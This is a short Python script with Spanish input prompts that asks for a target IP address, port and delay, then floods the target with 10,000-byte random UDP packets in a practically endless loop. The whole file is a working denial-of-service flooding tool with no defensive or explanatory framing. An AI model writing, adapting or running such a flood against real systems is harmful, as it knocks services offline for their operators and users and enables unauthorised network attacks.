import socket, random, time
 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
ip = input("Ingresar la IP objetivo: ")
port = int(input("Ingresar el Puerto objetivo: "))
sleep = float(input("Tiempo de espera: "))
 
s.connect((ip, port))
 
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)